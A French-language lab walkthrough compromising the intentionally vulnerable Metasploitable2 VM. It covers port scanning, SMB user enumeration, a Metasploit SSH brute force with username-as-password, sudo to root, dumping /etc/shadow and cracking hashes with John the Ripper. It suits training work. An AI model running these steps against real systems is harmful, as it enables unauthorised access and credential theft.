# Metasploitable2-linux

1.Énumération

***👁️ Massap***

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $sudo sh massap.sh 
Entrer une IP: 192.168.56.20
Entrer un rate: 1000
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2024-12-16 11:51:34 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 12:54 CET           
NSE: Loaded 150 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:54
Completed NSE at 12:54, 10.01s elapsed
Initiating NSE at 12:54
Completed NSE at 12:54, 0.00s elapsed
Initiating ARP Ping Scan at 12:54
Scanning 192.168.56.20 [1 port]
Completed ARP Ping Scan at 12:54, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:54
Completed Parallel DNS resolution of 1 host. at 12:54, 0.00s elapsed
Initiating SYN Stealth Scan at 12:54
Scanning 192.168.56.20 [28 ports]
Discovered open port 3306/tcp on 192.168.56.20
Discovered open port 23/tcp on 192.168.56.20
Discovered open port 25/tcp on 192.168.56.20
Discovered open port 445/tcp on 192.168.56.20
Discovered open port 5900/tcp on 192.168.56.20
Discovered open port 53/tcp on 192.168.56.20
Discovered open port 139/tcp on 192.168.56.20
Discovered open port 21/tcp on 192.168.56.20
Discovered open port 22/tcp on 192.168.56.20
Discovered open port 80/tcp on 192.168.56.20
Discovered open port 513/tcp on 192.168.56.20
Discovered open port 2049/tcp on 192.168.56.20
Discovered open port 8180/tcp on 192.168.56.20
Discovered open port 1524/tcp on 192.168.56.20
Discovered open port 1099/tcp on 192.168.56.20
Discovered open port 8787/tcp on 192.168.56.20
Discovered open port 512/tcp on 192.168.56.20
Discovered open port 3632/tcp on 192.168.56.20
Discovered open port 5432/tcp on 192.168.56.20
Discovered open port 6000/tcp on 192.168.56.20
Discovered open port 6697/tcp on 192.168.56.20
Discovered open port 36533/tcp on 192.168.56.20
Discovered open port 8009/tcp on 192.168.56.20
Discovered open port 34168/tcp on 192.168.56.20
Discovered open port 2121/tcp on 192.168.56.20
Discovered open port 34287/tcp on 192.168.56.20
Discovered open port 514/tcp on 192.168.56.20
Discovered open port 50384/tcp on 192.168.56.20
Completed SYN Stealth Scan at 12:54, 0.11s elapsed (28 total ports)
Initiating Service scan at 12:54
Scanning 28 services on 192.168.56.20
```

&nbsp;

🐧 ***Enum4linux***

Le port `445` smb est ouvert on peut essayer de récupérer des nom d’utilisateur.

```
=======================================( Users on 192.168.56.20 )=======================================

user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]
```

&nbsp;

🖧 ***Partages***

```
 =================================( Share Enumeration on 192.168.56.20 )=================================


    Sharename       Type      Comment
    ---------       ----      -------
    print$          Disk      Printer Drivers
    tmp             Disk      oh noes!
    opt             Disk      
    IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
    ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.

    Server               Comment
    ---------            -------

    Workgroup            Master
    ---------            -------
    WORKGROUP            METASPLOITABLE

[+] Attempting to map shares on 192.168.56.20

//192.168.56.20/print$	Mapping: DENIED Listing: N/A Writing: N/A
//192.168.56.20/tmp	Mapping: OK Listing: OK Writing: N/A
//192.168.56.20/opt	Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_NETWORK_ACCESS_DENIED listing \*
//192.168.56.20/IPC$	Mapping: N/A Listing: N/A Writing: N/A
//192.168.56.20/ADMIN$	Mapping: DENIED Listing: N/A Writing: N/A

```

&nbsp;

***💥 Metasploit - module SSH Login***

On prend les user trouver précédemment , et on les ajoute a un fichier texte `user.txt`, on active le `user_as_password` pour que le nom d’utilisateur soit pris comme mot de passe

```
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set rhosts 192.168.56.20
rhosts => 192.168.56.20
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set user_file user.txt
user_file => user.txt
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set user_as_pass true
user_as_pass => true
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set threads 10
threads => 10
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> run

[*] 192.168.56.20:22 - Starting bruteforce
[+] 192.168.56.20:22 - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[!] No active DB -- Credential data will not be saved!
[*] SSH session 1 opened (192.168.56.104:33223 -> 192.168.56.20:22) at 2024-12-26 21:58:03 +0100
[+] 192.168.56.20:22 - Success: 'user:user' 'uid=1001(user) gid=1001(user) groups=1001(user) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] SSH session 2 opened (192.168.56.104:44453 -> 192.168.56.20:22) at 2024-12-26 21:58:05 +0100
[+] 192.168.56.20:22 - Success: 'service:service' 'uid=1002(service) gid=1002(service) groups=1002(service) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] SSH session 3 opened (192.168.56.104:43125 -> 192.168.56.20:22) at 2024-12-26 21:58:11 +0100
[+] 192.168.56.20:22 - Success: 'postgres:postgres' 'uid=108(postgres) gid=117(postgres) groups=114(ssl-cert),117(postgres) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] SSH session 4 opened (192.168.56.104:37995 -> 192.168.56.20:22) at 2024-12-26 22:08:35 +0100
```

&nbsp;

On test le 1<sup>ier</sup> user `msfadmin` a les droit root en s’authentifiant sans mot de passe

```bash
[msf](Jobs:0 Agents:2) auxiliary(scanner/ssh/ssh_login) >> sessions 1
[*] Starting interaction with 1...

bash -i
msfadmin@metasploitable:~$ sudo -s
bash -i
root@metasploitable:~# 

```

&nbsp;

Nous allons récupérer les `hash` des `users` du système.

```
root@metasploitable:~# cat /etc/shadow	
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
statd:*:15474:0:99999:7:::
```

&nbsp;

***🧨 JohnTheRipper***

Ensuite nous allons prendre les `hash` des user du fichier `shadow` pour cracker leur mot de passe

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $john hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Remaining 2 password hash
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
sys         (batman)
klog        (123456789)     
1g 0:00:00:00 DONE 2/2 (2025-01-15 18:59) 1.724g/s 165.5p/s 165.5c/s 165.5C/s 123456789..999995
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
┌─[windows@windows]─[~/Desktop]
└──╼ $john --show hash
sys:batman:14742:0:99999:7:::
klog:123456789:14742:0:99999:7:::

2 password hashes cracked, 0 left
```

&nbsp;

Pour résumer , on a réussi a avoir le mot de passe des user du système

| User | Password |
| --- | --- |
| service | service |
| postgres | postgres |
| sys | batman |
| msfadmin | msfadmin |
| user | user |
| klog | 123456789 |
